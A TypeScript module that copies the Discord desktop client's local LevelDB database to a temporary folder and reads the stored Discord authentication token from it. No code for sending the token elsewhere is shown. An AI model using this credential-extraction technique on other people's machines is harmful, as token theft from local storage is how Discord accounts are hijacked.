import { Level } from 'level';
import { DISCORD_LEVELDB_PATH, DISCORD_TMP_PREFIX, DISCORD_TOKEN_KEY, DISCORD_KEY_PREFIX } from './constants';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

/**
 * Creates a properly formatted key for the Discord LevelDB database by prepending
 * the Discord key prefix to the provided key string.
 *
 * @param key - The base key string to format
 * @returns A complete Discord LevelDB key with the proper prefix
 *
 * @example
 * // Create a key for accessing Discord settings
 * const settingsKey = makeDiscordKey('settings');
 */
export function makeDiscordKey(key: string) {
	return `${DISCORD_KEY_PREFIX}${key}`;
}

/**
 * Provides safe access to the Discord LevelDB database by creating a temporary copy
 * and cleaning up resources after operations are complete.
 *
 * This function:
 * 1. Creates a temporary directory
 * 2. Copies Discord's LevelDB database to the temporary directory
 * 3. Opens the database and passes it to the callback function
 * 4. Ensures proper cleanup of resources regardless of success or failure
 *
 * @template T - The return type of the callback function
 * @param cb - Callback function that receives the Level database instance and returns a promise
 * @returns A promise resolving to the value returned by the callback
 * @throws Will propagate any errors encountered during database operations
 *
 * @example
 * // Read a specific value from the Discord database
 * // Note: Most Discord keys are prefixed - use makeDiscordKey helper to add the prefix
 * const value = await withDiscordLocalStorage(async (db) => {
 *   const key = makeDiscordKey('settings');
 *   return await db.get(key);
 * });
 */
export async function withDiscordLocalStorage<T = unknown>(cb: (db: Level) => Promise<T>) {
	const tmpPath = await fs.mkdtemp(path.join(os.tmpdir(), DISCORD_TMP_PREFIX));
	let db: Level | undefined;
	try {
		await copyFolder(DISCORD_LEVELDB_PATH, tmpPath);
		db = new Level(tmpPath);
		await db.open();
		return await cb(db);
	} finally {
		await db?.close();
		await fs.rm(tmpPath, { recursive: true });
	}
}

export async function getDiscordRawToken() {
	const token = await withDiscordLocalStorage(async db => {
		const token = await db.get(DISCORD_TOKEN_KEY);
		if (!token) throw new Error('Token not found');
		return token;
	});
	return token.replace(/"/g, '').slice(1);
}

async function copyFolder(fromPath: string, toPath: string) {
	await fs.mkdir(toPath, { recursive: true });
	const files = await fs.readdir(fromPath);
	for (const file of files) {
		const from = `${fromPath}/${file}`;
		const to = `${toPath}/${file}`;
		const stats = await fs.stat(from);
		if (stats.isDirectory()) {
			await copyFolder(from, to);
		} else {
			await fs.copyFile(from, to);
		}
	}
}
